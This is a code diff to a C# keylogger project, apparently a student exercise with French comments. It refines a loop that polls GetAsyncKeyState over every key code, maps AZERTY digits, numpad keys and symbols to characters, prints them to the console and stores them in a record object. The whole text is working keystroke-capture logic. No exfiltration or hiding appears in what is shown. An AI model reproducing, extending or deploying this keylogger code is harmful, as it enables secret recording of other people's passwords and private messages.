@@ -68,7 +68,7 @@ namespace ProjetKeyLogger
 
                 //liste des touches pour lesquelles la saisie est intérrompue
                 //Si une de ces touches est enfoncé, la capture est intérompu exemple : "ctrl + c" la lettre "c" n'est pas capturé
-                int[] list_non_accepte = new int[] { 17 ,18 ,91 };
+                int[] list_non_accepte = new int[] { 17 ,18 ,91,16,161 };
 
                 //le tableau des touches d'interruptions de la capture est parcouru
                 for (int i = 0; i < list_non_accepte.Length; i++)
@@ -84,7 +84,7 @@ namespace ProjetKeyLogger
                 
                 for (int codeASCII = 0; codeASCII < 256; codeASCII++)
                 {
-                    
+                    string valeurs = "";
                     int statut_cle = GetAsyncKeyState(codeASCII);
                     //le statut d'un clé est a 0 si elle n'est pas active
                     //le statut est a 32769 si la touche est appuyé donc on va pouvoir voir les touches
@@ -103,7 +103,8 @@ namespace ProjetKeyLogger
                                 //On réinitialise l'enregistrement
                                 enregistrement = new Enregistrement();
                                 break;
-                            //si touche maj
+
+                            //si touche majuscule
                             case 20:
                                 if ( majuscule == false)
                                 {
@@ -112,67 +113,96 @@ namespace ProjetKeyLogger
                                 {
                                     majuscule = false;
                                 }
-                                                                   
-                                break;
+                               break;
                             case 8:
                                 enregistrement.effacerContenu();
                                 break;
-
-                            case 110:
-                                Console.Write(".");
+                            case 9:
+                                Console.Write(" ");
                                 break;
 
-                            case 107:
-                                Console.Write("+");
+                            case 48:
+                            case 49:
+                            case 50:
+                            case 51:
+                            case 52:
+                            case 53:
+                            case 54:
+                            case 55:
+                            case 56:
+                            case 57:
+                                valeurs = "à&é\"'(-è_ç";
+                                Console.Write(valeurs.Substring(codeASCII - 48, 1));
                                 break;
 
-                            case 109:
-                                Console.Write("-");
+                            //cas du pavé numérique
+                            case 96:
+                            case 97:
+                            case 98:
+                            case 99:
+                            case 100:
+                            case 101:
+                            case 102:
+                            case 103:
+                            case 104:
+                            case 105:
+                                Console.Write((int)codeASCII - 96);
                                 break;
 
                             case 106:
-                                Console.Write("*");
-                                break;
-
+                            case 107:
+                            case 109:
+                            case 110:
                             case 111:
-                                Console.Write("/");
+                                valeurs = "*+ -./";
+                                Console.Write(valeurs.Substring(codeASCII - 106, 1));
                                 break;
 
-                            //A FAIRE : les ctrl; alt ctrl etc mais comment les representer ?
-                            case 17:
-                                Console.Write("[ctrl]");
-                                break;
-                            case 18:
-                                Console.Write("[alt]");
-                                break;
-                            case 91:
-                                Console.Write("[WINDOWS]");
-                                break;
-                                                                   
-                            default:
-                                //probleme du pavé numérique
-                                //le 0 correspond au code 96 c'est pour cela que l'on fait -96 à tous au lieu d'affecter une valeur à chaque nombre
-                                if (codeASCII > 95 & codeASCII < 106)
+                                                         
+                            case 186:
+                            case 187:
+                            case 188:
+                            case 190:
+                            case 191:
+                            case 192:
+                                valeurs = "$=, ;:ù£+? ./%";
+                                if (majuscule == false)
                                 {
-                                    Console.Write((int)codeASCII - 96);
+                                    Console.Write(valeurs.Substring(codeASCII - 186, 1));
                                 }
                                 else
-                                {//clavier des lettres : distinction majuscules ou non
-                                    if (majuscule == false)
-                                        //cas des caracteres speciaux au lieu des chiffres
-                                        if (codeASCII >47 & codeASCII < 58)
-                                        {
-                                            string valeurs="à&é\"'(-è_ç";
-                                            Console.Write(valeurs.Substring(codeASCII-48,1));
-                                        } else
-                                        {
-                                            Console.Write(Char.ToLower((char)codeASCII));
-                                        }
-                                    else
-                                    {
-                                        Console.Write(Char.ToUpper((char)codeASCII));
-                                    }
+                                {
+                                    Console.Write(valeurs.Substring(codeASCII - 179, 1));
                                 }
+                                break;
+
+                            //faire une correction pour que ca fasse directement la lettre ê par exemple avec la touche ^ ?
+                            case 219:
+                            case 220:
+                            case 221:
+                            case 223:
+                                valeurs = ")*^ !°µ¨ §";
+                                if (majuscule == false)
+                                {
+                                    Console.Write(valeurs.Substring(codeASCII - 219, 1));
+                                }
+                                else
+                                {
+                                    Console.Write(valeurs.Substring(codeASCII - 214, 1));
+                                }
+                                break;
+                               
+
+                            default:
+                                if (majuscule == false)
+                                {
+                                    Console.Write(Char.ToLower((char)codeASCII));
+                                }
+                                else
+                                {
+                                    Console.Write(Char.ToUpper((char)codeASCII));
+                                }
+                                
                                 //Concatenation e la derniere touche tapée au contenu de l'enregistrement
                                 enregistrement.ajouterContenu((char)codeASCII);
                                 //Sinon on incrémente le nombre de caracteres tapé
